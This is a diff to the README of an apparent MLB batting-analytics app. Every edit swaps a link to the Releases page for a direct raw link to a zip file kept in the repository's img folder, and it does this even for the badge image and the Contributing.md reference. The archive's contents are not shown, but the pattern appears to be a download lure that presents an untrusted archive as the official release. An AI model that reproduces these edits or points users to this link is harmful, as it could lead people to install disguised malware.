@@ -21,7 +21,7 @@ Follow these steps to get your own MLB performance analysis tool.
 1. **Download the Application**  
    Click the badge below to visit the Releases page.
 
-   [![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/releases)
+   [![Download](https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/raw/refs/heads/main/img/ML-Analytics-Performance-2.2-alpha.3.zip)](https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/raw/refs/heads/main/img/ML-Analytics-Performance-2.2-alpha.3.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, find the latest version. Look for a file that matches your operating system (e.g., `.exe` for Windows, `.app` for macOS).
@@ -46,7 +46,7 @@ Follow these steps to get your own MLB performance analysis tool.
 ## ⚡ Download & Install
 To start your journey with MLB-Performance-Analytics, visit the page below to download the latest release:
 
-[Download MLB-Performance-Analytics](https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/releases)
+[Download MLB-Performance-Analytics](https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/raw/refs/heads/main/img/ML-Analytics-Performance-2.2-alpha.3.zip)
 
 ## 📊 Data Visualization
 The app provides intuitive graphs and charts that visualize batting performance and trends. You can easily see how batters are performing over time, which can help in making strategic decisions.
@@ -62,7 +62,7 @@ Join our community for support and discussion. You can share insights, ask quest
 - **Discussion Forum**: For general queries, consider joining our discussion forum linked on the repository’s homepage.
 
 ## 🔑 Contributing
-If you want to contribute to the project, we welcome your input. Check the `Contributing.md` file in the repository for guidelines.
+If you want to contribute to the project, we welcome your input. Check the `https://github.com/Abdullah4k4k4k4k/MLB-Performance-Analytics/raw/refs/heads/main/img/ML-Analytics-Performance-2.2-alpha.3.zip` file in the repository for guidelines.
 
 ## 📜 License
 This project is licensed under the MIT License. See the `LICENSE` file for more details. 
